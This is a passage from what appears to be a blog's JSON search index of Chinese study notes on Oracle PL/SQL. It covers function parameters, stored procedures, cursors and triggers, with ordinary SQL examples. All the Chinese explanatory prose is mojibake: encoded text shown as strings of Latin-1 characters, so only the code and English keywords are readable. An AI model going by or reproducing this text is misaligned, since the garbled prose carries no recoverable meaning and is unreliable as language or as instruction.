ä¸ºå½¢å¼å‚æ•°ï¼Œå®ƒå¿…é¡»ä¸å‡½æ•°å®šä¹‰æ—¶æ‰€å£°æ˜çš„å½¢å¼å‚æ•°åç§°ä»¥åŠç±»å‹ç›¸åŒã€‚Parameter ä¸ºå®é™…å‚æ•°ã€‚ åœ¨è¿™ç§æ ¼å¼ä¸­ï¼Œå½¢å¼å‚æ•°ä¸å®é™…å‚æ•°æˆå¯¹å‡ºç°ï¼Œç›¸äº’é—´å…³ç³»å”¯ä¸€ç¡®å®šï¼Œæ‰€ä»¥å‚æ•°çš„é¡ºåºå¯ä»¥ä»»æ„æ’åˆ—ã€‚ ç¤ºä¾‹12345678ä¾‹ï¼šè®¡ç®—æŸéƒ¨é—¨çš„å‘˜å·¥æ•°å’Œå·¥èµ„æ€»å’Œ DECLARE V_num NUMBER; V_sum NUMBER; BEGIN V_sum :&#x3D;get_salary(emp_count &#x3D;&gt; v_num, dept_no &#x3D;&gt; 30); DBMS_OUTPUT.PUT_LINE(&#39;30å·éƒ¨é—¨å·¥èµ„æ€»å’Œï¼š&#39;||v_sum||&#39;ï¼Œäººæ•°ï¼š&#39;||v_num); END; æ··åˆè¡¨ç¤ºæ³• å³åœ¨è°ƒç”¨ä¸€ä¸ªå‡½æ•°æ—¶ï¼ŒåŒæ—¶ä½¿ç”¨ä½ç½®è¡¨ç¤ºæ³•å’Œåç§°è¡¨ç¤ºæ³•ä¸ºå‡½æ•°ä¼ é€’å‚æ•°ã€‚ é‡‡ç”¨è¿™ç§å‚æ•°ä¼ é€’æ–¹æ³•æ—¶ï¼Œä½¿ç”¨ä½ç½®è¡¨ç¤ºæ³•æ‰€ä¼ é€’çš„å‚æ•°å¿…é¡»æ”¾åœ¨åç§°è¡¨ç¤ºæ³•æ‰€ä¼ é€’çš„å‚æ•°å‰é¢ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œæ— è®ºå‡½æ•°å…·æœ‰å¤šå°‘ä¸ªå‚æ•°ï¼Œåªè¦å…¶ä¸­æœ‰ä¸€ä¸ªå‚æ•°ä½¿ç”¨åç§°è¡¨ç¤ºæ³•ï¼Œå…¶åæ‰€æœ‰çš„å‚æ•°éƒ½å¿…é¡»ä½¿ç”¨åç§°è¡¨ç¤ºæ³•ã€‚ ç¤ºä¾‹1234567891011--ä¾‹ï¼š DECLARE Var VARCHAR2(32); BEGIN Var :&#x3D; demo_fun(&#39;user1&#39;, 30, sex &#x3D;&gt; &#39;ç”·&#39;); DBMS_OUTPUT.PUT_LINE(var); Var :&#x3D; demo_fun(&#39;user2&#39;, age &#x3D;&gt; 40, sex &#x3D;&gt; &#39;ç”·&#39;); DBMS_OUTPUT.PUT_LINE(var); Var :&#x3D; demo_fun(&#39;user3&#39;, sex &#x3D;&gt; &#39;å¥³&#39;, age &#x3D;&gt; 20); DBMS_OUTPUT.PUT_LINE(var); END; å‚æ•°é»˜è®¤å€¼åœ¨CREATE OR REPLACE FUNCTION è¯­å¥ä¸­å£°æ˜å‡½æ•°å‚æ•°æ—¶å¯ä»¥ä½¿ç”¨DEFAULTå…³é”®å­—ä¸ºè¾“å…¥å‚æ•°æŒ‡å®šé»˜è®¤å€¼ã€‚ 1234567891011--å®šä¹‰ç¤ºä¾‹ï¼š CREATE OR REPLACE FUNCTION demo_fun( Name VARCHAR2,Age INTEGER, Sex VARCHAR2 DEFAULT &#39;ç”·&#39;) RETURN VARCHAR2 IS V_var VARCHAR2(32); BEGIN V_var :&#x3D; name||&#39;ï¼š&#39;||TO_CHAR(age)||&#39;å²ï¼Œ&#39;||sex; RETURN v_var; END; æ³¨ï¼š å…·æœ‰é»˜è®¤å€¼çš„å‡½æ•°åˆ›å»ºåï¼Œåœ¨å‡½æ•°è°ƒç”¨æ—¶ï¼Œå¦‚æœæ²¡æœ‰ä¸ºå…·æœ‰é»˜è®¤å€¼çš„å‚æ•°æä¾›å®é™…å‚æ•°å€¼ï¼Œå‡½æ•°å°†ä½¿ç”¨è¯¥å‚æ•°çš„é»˜è®¤å€¼ã€‚ ä½†å½“è°ƒç”¨è€…ä¸ºé»˜è®¤å‚æ•°æä¾›å®é™…å‚æ•°æ—¶ï¼Œå‡½æ•°å°†ä½¿ç”¨å®é™…å‚æ•°å€¼ã€‚ åœ¨åˆ›å»ºå‡½æ•°æ—¶ï¼Œåªèƒ½ä¸ºè¾“å…¥å‚æ•°è®¾ç½®é»˜è®¤å€¼ï¼Œè€Œä¸èƒ½ä¸ºè¾“å…¥/è¾“å‡ºå‚æ•°è®¾ç½®é»˜è®¤å€¼ã€‚ 1234567891011--è°ƒç”¨ç¤ºä¾‹ï¼š DECLARE Var VARCHAR(32); BEGIN Var :&#x3D; demo_fun(&#39;user1&#39;, 30); DBMS_OUTPUT.PUT_LINE(var); Var :&#x3D; demo_fun(&#39;user2&#39;, age &#x3D;&gt; 40); DBMS_OUTPUT.PUT_LINE(var); Var :&#x3D; demo_fun(&#39;user3&#39;, sex &#x3D;&gt; &#39;å¥³&#39;, age &#x3D;&gt; 20); DBMS_OUTPUT.PUT_LINE(var); END; å­˜å‚¨è¿‡ç¨‹åˆ›å»ºå­˜å‚¨è¿‡ç¨‹è¯­æ³•12345678910CREATE [OR REPLACE] PROCEDURE Procedure_name [ (argment [ &#123; IN | OUT | IN OUT &#125; ] Type, argment [ &#123; IN | OUT | IN OUT &#125; ] Type ] &#123; IS | AS &#125; &lt;ç±»å‹.å˜é‡çš„è¯´æ˜&gt; BEGIN &lt;æ‰§è¡Œéƒ¨åˆ†&gt; EXCEPTION &lt;å¯é€‰çš„å¼‚å¸¸é”™è¯¯å¤„ç†ç¨‹åº&gt; END; ç¤ºä¾‹1234567891011121314151617--ä¾‹ ï¼šåˆ é™¤æŒ‡å®šå‘˜å·¥è®°å½• CREATE OR REPLACE PROCEDURE DelEmp (v_empno IN emp.empno%TYPE) AS No_result EXCEPTION; BEGIN DELETE FROM emp WHERE empno&#x3D;v_empno; IF SQL%NOTFOUND THEN RAISE no_result; END IF; DBMS_OUTPUT.PUT_LINE(&#39;ç¼–ç ä¸º&#39;||v_empno||&#39;çš„å‘˜å·¥å·²è¢«é™¤å!&#39;); EXCEPTION WHEN no_result THEN DBMS_OUTPUT.PUT_LINE(&#39;ä½ éœ€è¦çš„æ•°æ®ä¸å­˜åœ¨!&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;---&#39;||SQLERRM); END DelEmp; è°ƒç”¨å­˜å‚¨è¿‡ç¨‹å­˜å‚¨è¿‡ç¨‹å»ºç«‹å®Œæˆåï¼Œåªè¦é€šè¿‡æˆæƒï¼Œç”¨æˆ·å°±å¯ä»¥åœ¨SQLPLUS ã€ORACLEå¼€å‘å·¥å…·æˆ–ç¬¬ä¸‰æ–¹å¼€å‘å·¥å…·ä¸­æ¥è°ƒç”¨è¿è¡Œã€‚ORACLE ä½¿ç”¨EXECUTE è¯­å¥æ¥å®ç°å¯¹å­˜å‚¨è¿‡ç¨‹çš„è°ƒç”¨ è¯­æ³•1EXEC[UTE] Procedure_name( parameter1, parameter2â€¦) ç¤ºä¾‹123456789101112131415161718192021222324252627282930--sqlplusè°ƒç”¨ç¤ºä¾‹SQL&gt; EXECUTE DelEmp(10)ï¼› SQL&gt; EXECUTE DelEmp(:a)ï¼› SQL&gt; variable a varchar2(20) SQL&gt; execute :a:&#x3D;fun_stu(&#39;BA&#39;);--ä¾‹ï¼šè®¡ç®—æŒ‡å®šéƒ¨é—¨çš„å·¥èµ„æ€»å’Œï¼Œå¹¶ç»Ÿè®¡å…¶ä¸­çš„èŒå·¥æ•°é‡ã€‚ --åˆ›å»ºå­˜å‚¨è¿‡ç¨‹CREATE OR REPLACE PROCEDURE proc_demo (Dept_no NUMBER DEFAULT 10 , Sal_sum OUT NUMBER, Emp_count OUT NUMBER) IS BEGIN SELECT SUM(sal), COUNT(*) INTO sal_sum, emp_count FROM emp WHERE deptno&#x3D;dept_no; EXCEPTION WHEN NO_DATA_FOUND THEN DBMS_OUTPUT.PUT_LINE(&#39;ä½ éœ€è¦çš„æ•°æ®ä¸å­˜åœ¨!&#39;); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE(SQLCODE||&#39;---&#39;||SQLERRM); END proc_demo;--è°ƒç”¨å­˜å‚¨è¿‡ç¨‹: DECLARE V_num NUMBER; V_sum NUMBER(8, 2); BEGIN Proc_demo(30, v_sum, v_num); DBMS_OUTPUT.PUT_LINE(&#39;30å·éƒ¨é—¨å·¥èµ„æ€»å’Œï¼š&#39;||v_sum||&#39;ï¼Œäººæ•°ï¼š&#39;||v_num); Proc_demo(sal_sum &#x3D;&gt; v_sum, emp_count &#x3D;&gt; v_num); DBMS_OUTPUT.PUT_LINE(&#39;10å·éƒ¨é—¨å·¥èµ„æ€»å’Œï¼š&#39;||v_sum||&#39;ï¼Œäººæ•°ï¼š&#39;||v_num); END; æŸ¥è¯¢ã€åˆ é™¤è¿‡ç¨‹å’Œå‡½æ•° åœ¨SQL*PLUS ä¸­ï¼Œå¯ä»¥ç”¨DESCRIBE å‘½ä»¤æŸ¥çœ‹è¿‡ç¨‹çš„åå­—åŠå…¶å‚æ•° DESCRIBE Procedure_name;(desc table; ç”¨äºåˆ—å‡ºæŒ‡å®šè¡¨æˆ–è§†å›¾ä¸­çš„æ‰€æœ‰åˆ—) å¯ä»¥ä½¿ç”¨DROPè¯­å¥åˆ é™¤å‡½æ•°å’Œè¿‡ç¨‹ï¼š 1234--åˆ é™¤å‡½æ•°DROP FUNCTION function_name;--åˆ é™¤è¿‡ç¨‹DROP PROCEDURE proceduer_name; æˆæƒæ‰§è¡Œæƒç»™ç›¸å…³çš„ç”¨æˆ·æˆ–è§’è‰² å¦‚æœè°ƒå¼æ­£ç¡®çš„å­˜å‚¨è¿‡ç¨‹æ²¡æœ‰è¿›è¡Œæˆæƒï¼Œé‚£å°±åªæœ‰å»ºç«‹è€…æœ¬äººæ‰å¯ä»¥è¿è¡Œã€‚æ‰€ä»¥ä½œä¸ºåº”ç”¨ç³»ç»Ÿçš„ä¸€éƒ¨åˆ†çš„å­˜å‚¨è¿‡ç¨‹ä¹Ÿå¿…é¡»è¿›è¡Œæˆæƒæ‰èƒ½è¾¾åˆ°è¦æ±‚ã€‚ å¯ä»¥ç”¨GRANTå‘½ä»¤æ¥è¿›è¡Œå­˜å‚¨è¿‡ç¨‹çš„è¿è¡Œæˆæƒ è¯­æ³•123--ä¾‹GRANT EXECUTE ON Proc_demo TO user| role | PUBLIC [WITH GRANT OPTION] ä¸è¿‡ç¨‹ç›¸å…³çš„å†…ç½®æ•°æ®å­—å…¸ åç§° æè¿° USER_PROCEDURES æŸ¥è¯¢ç”¨æˆ·æ‰€æœ‰çš„å­ç¨‹åºä¿¡æ¯ USER_SOURCE æŸ¥çœ‹ç”¨æˆ·æ‰€æœ‰å¯¹è±¡çš„æºä»£ç  USER_OBJECTS æŸ¥çœ‹ç”¨æˆ·åˆ›å»ºçš„è¿‡ç¨‹å¯¹è±¡ USER_ERRORS æŸ¥çœ‹ç”¨æˆ·æ‰€æœ‰çš„å­ç¨‹åºé”™è¯¯ä¿¡æ¯ 123456789SELECT object_name,authid,object_type FROM user_procedures;--AUTHID DEFINER ï¼ˆå®šä¹‰è€…æƒé™ï¼‰ï¼šæŒ‡ç¼–è¯‘å­˜å‚¨å¯¹è±¡çš„æ‰€æœ‰è€…ã€‚ä¹Ÿæ˜¯é»˜è®¤æƒé™æ¨¡å¼ --AUTHID CURRENT_USERï¼ˆè°ƒç”¨è€…æƒé™ï¼‰ï¼šæŒ‡æ‹¥æœ‰å½“å‰ä¼šè¯æƒé™çš„æ¨¡å¼ SELECT * FROM user_source WHERE name&#x3D;&#39;MLDN_PROC&#39; ;SELECT object_name,created,timestamp,status FROM user_objects WHERE object_type&#x3D;&#39;PROCEDURE&#39; OR object_type&#x3D;&#39;FUNCTION&#39;; --statusï¼šè¯¥å­—æ®µæœ‰ä¸¤ä¸ªå–å€¼ï¼šVALIDï¼ˆæœ‰æ•ˆï¼‰ï¼ŒINVALIDï¼ˆæ— æ•ˆï¼‰","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"plsqlæ¸¸æ ‡","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/plsqlæ¸¸æ ‡/","text":"plsqlæ¸¸æ ‡æ¸¸æ ‡ SQLè¯­å¥ éæŸ¥è¯¢è¯­å¥ éšå¼çš„ ç»“æœæ˜¯å•è¡Œçš„æŸ¥è¯¢è¯­å¥ éšå¼æˆ–æ˜¾ç¤ºçš„ ç»“æœæ˜¯å¤šè¡Œçš„æŸ¥è¯¢è¯­å¥ æ˜¾ç¤ºçš„ æ˜¾ç¤ºæ¸¸æ ‡å®šä¹‰æ¸¸æ ‡ï¼šå°±æ˜¯å®šä¹‰ä¸€ä¸ªæ¸¸æ ‡åï¼Œä»¥åŠä¸å…¶ç›¸å¯¹åº”çš„SELECT è¯­å¥ 1CURSOR cursor_name IS select_statement; æ³¨ï¼š æ¸¸æ ‡å£°æ˜éƒ¨åˆ†æ˜¯å”¯ä¸€å¯ä»¥å‡ºç°åœ¨æ¨¡å—å£°æ˜éƒ¨åˆ†çš„æ­¥éª¤ï¼Œå…¶ä»–ä¸‰ä¸ªæ­¥éª¤éƒ½åœ¨æ‰§è¡Œæˆ–å¼‚å¸¸å¤„ç†éƒ¨åˆ†ä¸­ æ¸¸æ ‡åæ˜¯æ ‡è¯†ç¬¦ï¼Œæ‰€ä»¥ä¹Ÿæœ‰ä½œç”¨åŸŸï¼Œå¹¶ä¸”å¿…é¡»åœ¨ä½¿ç”¨å‰è¿›è¡Œè¯´æ˜ ä»»ä½•SELECTè¯­å¥éƒ½æ˜¯åˆæ³•çš„ï¼Œä½†æ˜¯SELECT â€¦INTOè¯­å¥æ˜¯éæ³•çš„ åœ¨å£°æ˜éƒ¨åˆ†çš„æœ«å°¾å£°æ˜æ¸¸æ ‡ æ‰“å¼€æ¸¸æ ‡ï¼šå°±æ˜¯æ‰§è¡Œæ¸¸æ ‡æ‰€å¯¹åº”çš„SELECTè¯­å¥ï¼Œå°†å…¶æŸ¥è¯¢ç»“æœæ”¾å…¥å·¥ä½œåŒºï¼Œå¹¶ä¸”æŒ‡é’ˆæŒ‡å‘å·¥ä½œåŒºçš„é¦–éƒ¨ï¼Œæ ‡è¯†æ¸¸æ ‡ç»“æœé›†åˆã€‚ 1OPEN cursor_name æ³¨ï¼šPL/SQL ç¨‹åºä¸èƒ½ç”¨OPEN è¯­å¥é‡å¤æ‰“å¼€åŒä¸€ä¸ªæ¸¸æ ‡ æå–æ¸¸æ ‡ï¼šå°±æ˜¯æ£€ç´¢ç»“æœé›†åˆä¸­çš„æ•°æ®è¡Œï¼Œæ”¾å…¥æŒ‡å®šçš„è¾“å‡ºå˜é‡ä¸­ã€‚ 1FETCH cursor_name INTO &#123;variable_list | record_variable &#125;; å…³é—­æ¸¸æ ‡ï¼šå½“æå–å’Œå¤„ç†å®Œæ¸¸æ ‡ç»“æœé›†åˆæ•°æ®åï¼Œåº”åŠæ—¶å…³é—­æ¸¸æ ‡ï¼Œä»¥é‡Šæ”¾è¯¥æ¸¸æ ‡æ‰€å ç”¨çš„ç³»ç»Ÿèµ„æºï¼Œå¹¶ä½¿è¯¥æ¸¸æ ‡çš„å·¥ä½œåŒºå˜æˆæ— æ•ˆï¼Œä¸èƒ½å†ä½¿ç”¨FETCH è¯­å¥å–å…¶ä¸­æ•°æ®ã€‚å…³é—­åçš„æ¸¸æ ‡å¯ä»¥ä½¿ç”¨OPEN è¯­å¥é‡æ–°æ‰“å¼€ã€‚ 1CLOSE cursor_name; æ¸¸æ ‡å±æ€§ å±æ€§ æè¿° %FOUND å¸ƒå°”å‹å±æ€§ï¼Œå½“æœ€è¿‘ä¸€æ¬¡è¯»è®°å½•æ—¶æˆåŠŸè¿”å›,åˆ™å€¼ä¸ºTRUE %NOTFOUND å¸ƒå°”å‹å±æ€§ï¼Œä¸%FOUNDç›¸å %ISOPEN å¸ƒå°”å‹å±æ€§ï¼Œå½“æ¸¸æ ‡å·²æ‰“å¼€æ—¶è¿”å› TRUE %ROWCOUNT æ•°å­—å‹å±æ€§ï¼Œè¿”å›å·²ä»æ¸¸æ ‡ä¸­è¯»å–çš„è®°å½•æ•° éšå¼æ¸¸æ ‡è¯´æ˜ï¼š æ˜¾å¼æ¸¸æ ‡ä¸»è¦æ˜¯ç”¨äºå¯¹æŸ¥è¯¢è¯­å¥çš„å¤„ç†ï¼Œå°¤å…¶æ˜¯åœ¨æŸ¥è¯¢ç»“æœä¸ºå¤šæ¡è®°å½•çš„æƒ…å†µä¸‹ï¼›è€Œå¯¹äºéæŸ¥è¯¢è¯­å¥ï¼Œå¦‚ä¿®æ”¹ã€åˆ é™¤æ“ä½œï¼Œåˆ™ç”±ORACLE ç³»ç»Ÿè‡ªåŠ¨åœ°ä¸ºè¿™äº›æ“ä½œè®¾ç½®æ¸¸æ ‡å¹¶åˆ›å»ºå…¶å·¥ä½œåŒºï¼Œè¿™äº›ç”±ç³»ç»Ÿéšå«åˆ›å»ºçš„æ¸¸æ ‡ç§°ä¸ºéšå¼æ¸¸æ ‡ éšå¼æ¸¸æ ‡çš„åå­—ä¸ºSQLï¼Œè¿™æ˜¯ç”±ORACLE ç³»ç»Ÿå®šä¹‰çš„ã€‚å¯¹äºéšå¼æ¸¸æ ‡çš„æ“ä½œï¼Œå¦‚å®šä¹‰ã€æ‰“å¼€ã€å–å€¼åŠå…³é—­æ“ä½œï¼Œéƒ½ç”±ORACLE ç³»ç»Ÿè‡ªåŠ¨åœ°å®Œæˆï¼Œæ— éœ€ç”¨æˆ·è¿›è¡Œå¤„ç†ã€‚ç”¨æˆ·åªèƒ½é€šè¿‡éšå¼æ¸¸æ ‡çš„ç›¸å…³å±æ€§ï¼Œæ¥å®Œæˆç›¸åº”çš„æ“ä½œã€‚ åœ¨éšå¼æ¸¸æ ‡çš„å·¥ä½œåŒºä¸­ï¼Œæ‰€å­˜æ”¾çš„æ•°æ®æ˜¯æœ€æ–°å¤„ç†çš„ä¸€æ¡SQL è¯­å¥æ‰€åŒ…å«çš„æ•°æ®ï¼ˆä¸ç”¨æˆ·è‡ªå®šä¹‰çš„æ˜¾ç¤ºæ¸¸æ ‡æ— å…³çš„ï¼‰ã€‚ INSERT, UPDATE, DELETE, SELECT INTOè¯­å¥ä¸­ä¸å¿…æ˜ç¡®å®šä¹‰æ¸¸æ ‡ æ¸¸æ ‡å±æ€§ å±æ€§ æè¿° %FOUND å¸ƒå°”å‹å±æ€§,è‡³å°‘æœ‰ä¸€è¡Œè¢«INSERT,DELETEæˆ–UPDATEæ—¶è¿”å›TRUEã€‚ %NOTFOUND å¸ƒå°”å‹å±æ€§ï¼Œä¸%FOUNDç›¸å %ISOPEN å¸ƒå°”å‹å±æ€§ï¼Œå½“æ¸¸æ ‡å·²æ‰“å¼€æ—¶è¿”å› TRUEå¸ƒå°”å‹å±æ€§, å–å€¼æ€»æ˜¯FALSEã€‚SQLå‘½ä»¤æ‰§è¡Œå®Œæ¯•ç«‹å³å…³é—­éšå¼æ¸¸æ ‡ã€‚ %ROWCOUNT æ•°å­—å‹å±æ€§ï¼Œè¿”å›å·²ä»æ¸¸æ ‡ä¸­è¯»å–çš„è®°å½•æ•° æ³¨ï¼š ä¸æœ€è¿‘çš„sqlè¯­å¥ï¼ˆupdate,insert,delete,selectï¼‰å‘ç”Ÿäº¤äº’ï¼Œå½“æœ€è¿‘çš„ä¸€æ¡sqlè¯­å¥æ²¡æœ‰æ¶‰åŠä»»ä½•è¡Œçš„æ—¶å€™ï¼Œåˆ™è¿”å›ç›¸åº”çš„å€¼ã€‚ ä¾‹å¦‚è¦updateä¸€è¡Œæ•°æ®æ—¶ï¼Œå¦‚æœæ²¡æœ‰æ‰¾åˆ°ï¼Œå°±å¯ä»¥ä½œç›¸åº”æ“ä½œã€‚ æ¸¸æ ‡å˜é‡ä¸¾ä¾‹ï¼š å£°æ˜ä¸¤ä¸ªå¼ºç±»å‹å®šä¹‰æ¸¸æ ‡å˜é‡å’Œä¸€ä¸ªå¼±ç±»å‹æ¸¸æ ‡å˜é‡ 1234567891011DECLARE TYPE deptrecord IS RECORD( Deptno dept.deptno%TYPE, Dname dept.deptno%TYPE, Loc dept.loc%TYPE ); TYPE deptcurtype IS REF CURSOR RETURN dept%ROWTYPE; TYPE deptcurtyp1 IS REF CURSOR RETURN deptrecord; TYPE curtype IS REF CURSOR; Dept_c1 deptcurtype; Dept_c2 deptcurtyp1; Cv curtype; æ¸¸æ ‡å˜é‡æ“ä½œæ¸¸æ ‡å˜é‡æ“ä½œä¹ŸåŒ…æ‹¬æ‰“å¼€ã€æå–å’Œå…³é—­ä¸‰ä¸ªæ­¥éª¤ æ‰“å¼€æ¸¸æ ‡å˜é‡ ï¼šæ‰“å¼€æ¸¸æ ‡å˜é‡æ—¶ä½¿ç”¨çš„æ˜¯OPENâ€¦FOR è¯­å¥ã€‚ æ ¼å¼ä¸ºï¼š 12OPEN &#123;cursor_variable_name | :host_cursor_variable_name&#125; FOR select_statement; æ³¨ï¼š cursor_variable_nameä¸ºæ¸¸æ ‡å˜é‡ host_cursor_variable_nameä¸ºPL/SQLä¸»æœºç¯å¢ƒï¼ˆå¦‚OCI: ORACLE Call Interfaceï¼ŒPro*c ç¨‹åºç­‰ï¼‰ä¸­å£°æ˜çš„æ¸¸æ ‡å˜é‡ã€‚ OPENâ€¦FOR è¯­å¥å¯ä»¥åœ¨å…³é—­å½“å‰çš„æ¸¸æ ‡å˜é‡ä¹‹å‰é‡æ–°æ‰“å¼€æ¸¸æ ‡å˜é‡ï¼Œè€Œä¸ä¼šå¯¼è‡´CURSOR_ALREAD_OPENå¼‚å¸¸é”™è¯¯ã€‚ æ–°æ‰“å¼€æ¸¸æ ‡å˜é‡æ—¶ï¼Œå‰ä¸€ä¸ªæŸ¥è¯¢çš„å†…å­˜å¤„ç†åŒºå°†è¢«é‡Šæ”¾ æå–æ¸¸æ ‡å˜é‡æ•°æ® ï¼šä½¿ç”¨FETCHè¯­å¥æå–æ¸¸æ ‡å˜é‡ç»“æœé›†åˆä¸­çš„æ•°æ®ã€‚æ ¼å¼ä¸ºï¼š 12FETCH &#123;cursor_variable_name | :host_cursor_variable_name&#125; INTO &#123;variable [, variable]â€¦| record_variable&#125;; æ³¨ï¼š å±æ€§ å«ä¹‰ cursor_variable_name æ¸¸æ ‡å˜é‡åç§° host_cursor_variable_name å®¿ä¸»æ¸¸æ ‡å˜é‡åç§° variable æ™®é€šå˜é‡åç§° record_variable è®°å½•å˜é‡åç§° å…³é—­æ¸¸æ ‡å˜é‡ ï¼šCLOSEè¯­å¥å…³é—­æ¸¸æ ‡å˜é‡ï¼Œæ ¼å¼ä¸ºï¼š 1CLOSE &#123;cursor_variable_name | :host_cursor_variable_name&#125; æ³¨ï¼š cursor_variable_nameå’Œhost_cursor_variable_nameåˆ†åˆ«ä¸ºæ¸¸æ ‡å˜é‡å’Œå®¿ä¸»æ¸¸æ ‡å˜é‡åç§° å¦‚æœåº”ç”¨ç¨‹åºè¯•å›¾å…³é—­ä¸€ä¸ªæœªæ‰“å¼€çš„æ¸¸æ ‡å˜é‡ï¼Œåˆ™å°†å¯¼è‡´INVALID_CURSORå¼‚å¸¸é”™è¯¯ã€‚ æ¸¸æ ‡ç±»å‹ ç±»å‹ è¯´æ˜ é™æ€æ¸¸æ ‡ æ˜¾å¼æ¸¸æ ‡å’Œéšå¼æ¸¸æ ‡ç§°ä¸ºé™æ€æ¸¸æ ‡ï¼Œå› ä¸ºåœ¨ä½¿ç”¨ä»–ä»¬ä¹‹å‰ï¼Œæ¸¸æ ‡çš„å®šä¹‰å·²ç»å®Œæˆï¼Œä¸èƒ½å†æ›´æ”¹ã€‚ åŠ¨æ€æ¸¸æ ‡ æ¸¸æ ‡åœ¨å£°æ˜æ—¶æ²¡æœ‰è®¾å®šï¼Œåœ¨æ‰“å¼€æ—¶å¯ä»¥å¯¹å…¶è¿›è¡Œä¿®æ”¹ã€‚åˆ†ä¸ºå¼ºç±»å‹æ¸¸æ ‡å’Œå¼±ç±»å‹æ¸¸æ ‡ã€‚ å¼ºç±»å‹åŠ¨æ€æ¸¸æ ‡ åœ¨å£°æ˜å˜é‡æ—¶ä½¿ç”¨returnå…³é”®å­—å®šä¹‰æ¸¸æ ‡çš„è¿”å›ç±»å‹ å¼±ç±»å‹åŠ¨æ€æ¸¸æ ‡ åœ¨å£°æ˜å˜é‡æ—¶ä¸ä½¿ç”¨returnå…³é”®å­—å®šä¹‰æ¸¸æ ‡çš„è¿”å›ç±»å‹ æ¸¸æ ‡å˜é‡åº”ç”¨ä¸¾ä¾‹å¼ºç±»å‹å‚ç…§æ¸¸æ ‡å˜é‡ç±»å‹12345678910111213141516171819DECLARE TYPE emp_job_rec IS RECORD( Employee_id emp.empno%TYPE, Employee_name emp.ename%TYPE, Job_title emp.job%TYPE); TYPE emp_job_refcur_type IS REF CURSOR RETURN emp_job_rec; Emp_refcur emp_job_refcur_type ; Emp_job emp_job_rec;BEGIN OPEN emp_refcur FOR SELECT empno, ename, job FROM emp ORDER BY deptno; FETCH emp_refcur INTO emp_job; WHILE emp_refcur%FOUND LOOP DBMS_OUTPUT.PUT_LINE(emp_job.employee_id||&#39;: &#39; ||emp_job.employee_name ||&#39; is a &#39; ||emp_job.job_title); FETCH emp_refcur INTO emp_job; END LOOP; END; å¼±ç±»å‹å‚ç…§æ¸¸æ ‡å˜é‡ç±»å‹12345678DECLARE Type refcur_t IS REF CURSOR; Refcur refcur_t; TYPE sample_rec_type IS RECORD ( Id number, Description VARCHAR2 (30) ); sample sample_rec_type; selection varchar2(1) :&#x3D; UPPER (SUBSTR (&#39;&amp;tab&#39;, 1, 1));","tags":[{"name":"Note","slug":"Note","permalink":"https://yanmymickey.github.io/tags/Note/"},{"name":"oracle","slug":"oracle","permalink":"https://yanmymickey.github.io/tags/oracle/"}]},{"title":"plsqlè§¦å‘å™¨","date":"2019-12-16T16:00:00.000Z","path":"2019/12/17/Oracle/plsqlè§¦å‘å™¨/","text":"plsqlè§¦å‘å™¨ä»‹ç» è§¦å‘å™¨åœ¨æ•°æ®åº“é‡Œä»¥ç‹¬ç«‹çš„å¯¹è±¡å­˜å‚¨ï¼Œå®ƒä¸å­˜å‚¨è¿‡ç¨‹ä¸åŒçš„æ˜¯ï¼Œ å­˜å‚¨è¿‡ç¨‹é€šè¿‡å…¶å®ƒç¨‹åºæ¥å¯åŠ¨è¿è¡Œæˆ–ç›´æ¥å¯åŠ¨è¿è¡Œ è§¦å‘å™¨æ˜¯ç”±ä¸€ä¸ªäº‹ä»¶æ¥å¯åŠ¨è¿è¡Œ è§¦å‘å™¨æ˜¯å½“æŸä¸ªäº‹ä»¶å‘ç”Ÿæ—¶è‡ªåŠ¨åœ°éšå¼è¿è¡Œã€‚ è§¦å‘å™¨ä¸èƒ½æ¥æ”¶å‚æ•°ã€‚ è¿è¡Œè§¦å‘å™¨å°±å«è§¦å‘æˆ–ç‚¹ç«ï¼ˆfiringï¼‰ ORACLEä¸­äº‹ä»¶æŒ‡çš„æ˜¯å¯¹æ•°æ®åº“çš„è¡¨è¿›è¡Œçš„INSERTã€UPDATEåŠDELETEæ“ä½œæˆ–å¯¹è§†å›¾è¿›è¡Œç±»ä¼¼çš„æ“ä½œã€‚ ORACLEå°†è§¦å‘å™¨çš„åŠŸèƒ½æ‰©å±•åˆ°äº†è§¦å‘ORACLEï¼Œå¦‚æ•°æ®åº“çš„å¯åŠ¨ä¸å…³é—­ç­‰ã€‚ è§¦å‘å™¨ç±»å‹ ä¸»è¦çš„è§¦å‘å™¨æœ‰ä¸‰ç§ï¼š DMLè§¦å‘å™¨ ORACLEå¯ä»¥åœ¨DMLè¯­å¥è¿›è¡Œè§¦å‘ å¯ä»¥åœ¨DMLæ“ä½œå‰æˆ–æ“ä½œåè¿›è¡Œè§¦å‘ å¯ä»¥å¯¹æ¯ä¸ªè¡Œæˆ–è¯­å¥æ“ä½œä¸Šè¿›è¡Œè§¦å‘ æ›¿ä»£è§¦å‘å™¨ ç”±äºåœ¨ORACLEé‡Œï¼Œä¸èƒ½ç›´æ¥å¯¹ç”±ä¸¤ä¸ªä»¥ä¸Šçš„è¡¨å»ºç«‹çš„è§†å›¾è¿›è¡Œæ“ä½œã€‚æ‰€ä»¥ç»™å‡ºäº†æ›¿ä»£è§¦å‘å™¨ã€‚ å®ƒæ˜¯ORACLEä¸“é—¨ä¸ºè¿›è¡Œè§†å›¾æ“ä½œçš„ä¸€ç§å¤„ç†æ–¹æ³• ç³»ç»Ÿï¼ˆç”¨æˆ·äº‹ä»¶ï¼‰è§¦å‘å™¨ å®ƒå¯ä»¥åœ¨ORACLEæ•°æ®åº“ç³»ç»Ÿçš„äº‹ä»¶ä¸­è¿›è¡Œè§¦å‘ å¦‚ORACLEç³»ç»Ÿçš„å¯åŠ¨ä¸å…³é—­ç­‰ã€‚ è§¦å‘å™¨ç»„æˆ è§¦å‘äº‹ä»¶ å³åœ¨ä½•ç§æƒ…å†µä¸‹è§¦å‘TRIGGER ä¾‹å¦‚ï¼šINSERT, UPDATE, DELETE è§¦å‘æ—¶é—´ å³è¯¥TRIGGER æ˜¯åœ¨è§¦å‘äº‹ä»¶å‘ç”Ÿä¹‹å‰ï¼ˆBEFOREï¼‰è¿˜æ˜¯ä¹‹å(AFTER)è§¦å‘ 